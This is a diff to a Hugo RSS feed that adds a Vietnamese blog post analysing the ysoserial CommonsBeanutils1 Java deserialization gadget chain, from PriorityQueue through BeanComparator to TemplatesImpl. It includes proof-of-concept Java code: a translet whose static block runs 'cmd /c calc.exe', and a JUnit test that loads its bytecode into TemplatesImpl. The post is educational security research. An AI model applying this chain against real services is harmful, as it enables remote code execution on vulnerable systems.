@@ -6,8 +6,154 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 18 Jan 2022 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Wed, 19 Jan 2022 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>[Java Deserialization] CommonsBeanutils1 exploit chain analysis</title>
+            <link>https://tranquac.github.io/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/</link>
+            <pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/</guid>
+            <description>Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1</description>
+            <content type="html"><![CDATA[<p>Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1</p>
+<p>Apache Commons Beanutils là một dự án khác thuộc bộ công cụ Apache Commons cung cấp một số phương thức thao tác trên các đối tượng lớp Java thông thường (còn được gọi là JavaBeans).</p>
+<h3 id="gadget-chain">Gadget chain</h3>
+<pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                siftDownUsingComparator()
+                    BeanComparator.compare()
+                        TemplatesImpl.getOutputProperties()
+                            TemplatesImpl.newTransformer()
+                                TemplatesImpl.getTransletInstance()
+                                    TemplatesImpl.defineTransletClasses()
+                                        TemplatesImpl.TransletClassLoader.defineClass()
+                                            Pwner*(Javassist-generated).&lt;static init&gt;
+                                                Runtime.exec()
+</code></pre><h3 id="phân-tích">Phân tích</h3>
+<p>Ví dụ, đây là lớp JavaBean đơn giản nhất</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg" alt=""></p>
+<p>Commons-beanutils cung cấp một phương thức tĩnh PropertyUtils.getProperty cho phép người dùng gọi trực tiếp phương thức getter của bất kỳ JavaBean nào, chẳng hạn như:</p>
+<pre><code>PropertyUtils.getProperty (Object bean, String name)
+</code></pre><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg" alt=""></p>
+<p>Lúc này, commons-beanutils sẽ tự động tìm phương thức getter của thuộc tính name, tức là getName, rồi gọi nó để lấy giá trị trả về. Bằng cách này, người dùng có thể dễ dàng gọi getter của bất kỳ đối tượng nào.</p>
+<p>Trong phương thức so sánh của lớp BeanComparator, có một lệnh gọi đến hàm PropertyUtils.getProperty, được thực hiện như sau:</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg" alt=""></p>
+<p>Phương thức này truyền vào 2 đối tượng. Nếu this.property là null thì so sánh hai objects trực tiếp với nhau, ngược lại this.property khác null, sẽ sử dụng PropertyUtils.getProperty để lấy giá trị property của hai đối tượng và so sánh chúng với nhau. Như đã nói ở trên, PropertyUtils.getProperty sẽ tự động gọi phương thức getter của JavaBean, đây là key để thực thi code tuỳ ý.</p>
+<p>Vậy có bất kì phương thức getter nào có thể thực thi mã tuỳ ý không?</p>
+<p><strong>TemplatesImpl chain</strong></p>
+<pre><code>TemplatesImpl#getOutputProperties -&gt;
+TemplatesImpl#newTransformer() -&gt;
+TemplatesImpl#getTransletInstance() -&gt; 
+TemplatesImpl#defineTransletClasses()-&gt; 
+TransletClassLoader#defineClass()
+</code></pre><p>Chain thức này đã được tìm thấy trước đó. PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer()</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg" alt=""></p>
+<p>Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại:</p>
+<pre><code>TemplatesImpl#newTransformer() -&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg" alt=""></p>
+<p>TemplatesImpl#getTransletInstance() -&gt;</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg" alt=""></p>
+<p>TemplatesImpl#defineTransletClasses()-&gt;</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg" alt=""></p>
+<p>TransletClassLoader#defineClass()</p>
+<p>Xây dựng TemplatesImpl</p>
+<pre><code>TemplatesImpl templates = new TemplatesImpl();
+setFieldValue(templates,&quot;_name&quot;, &quot;Pwnr&quot;);
+setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{malicious_bytes});
+PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+</code></pre><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg" alt=""></p>
+<p>Và sau đó truyền đối tượng TemplatesImpl vừa tạo vào BeanComparator</p>
+<pre><code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
+</code></pre><p><strong>PriorityQueue</strong></p>
+<p>ReadObject trong PriorityQueue sẽ gọi hàm heapify để sắp xếp các phần tử, sau đó kích hoạt phương thức comparator.compare tạo nên một chuỗi hoàn hảo. Chắc vẫn còn cách khác để trigger được comparator.compare nhưng trong gadget chain này tác giả đã sử dụng cách thức này. Càng phân tích càng thấy hâm mộ những con người đi trước sao có thể tìm được như vậy.</p>
+<pre><code>final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+</code></pre><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg" alt=""></p>
+<p>Chain hoàn chỉnh:</p>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg" alt=""></p>
+<p>Hoàn hảo!</p>
+<p>Code thao khảo:</p>
+<p><strong>RunCmd.class</strong></p>
+<pre><code>package com.summer.cb1;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+
+public class RunCmd extends AbstractTranslet{
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;calc.exe&quot;});
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+
+</code></pre><p><strong>TempletesTest class</strong></p>
+<pre><code>package com.summer.cb1;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.junit.Test;
+
+import java.lang.reflect.Field;
+
+public class TempletesTest {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static byte[] classToBytes() throws Exception{
+        byte[] bytes = ClassPool.getDefault().get(RunCmd.class.getName()).toBytecode();
+        return bytes;
+    }
+
+    @Test
+    public void test() throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates,&quot;_name&quot;, &quot;Pwnr&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{classToBytes()});
+        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+    }
+
+    
+}
+
+</code></pre><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg" alt=""></p>
+<p>Học được:</p>
+<ul>
+<li>Kĩ năng nghiên cứu, phân tích vấn đề</li>
+<li>Học được nhiều điều về java và phân tích gadget chain trong java deserialization.</li>
+</ul>
+<p>Ngày đầu ngồi đọc không hiểu gì. Ngày 2 bắt đầu vào phân tích thấy rất hay và vỡ ra nhiều điều. Mình sẽ phân tích các gadget chain khác hoặc một CVE nào đó về java deserialization trong thời gian tới.</p>
+<p>Tham khảo (Để hiểu được không biết tôi đã đọc bao nhiêu bài viết của các pháp sư Trung Hoa nữa!)</p>
+<p>Cảm ơn bạn đã đọc tới đây!</p>
+]]></content>
+        </item>
         
         <item>
             <title>[Java Deserialization] Thảo luận về cơ chế Serialize và Deserialize trong Java</title>
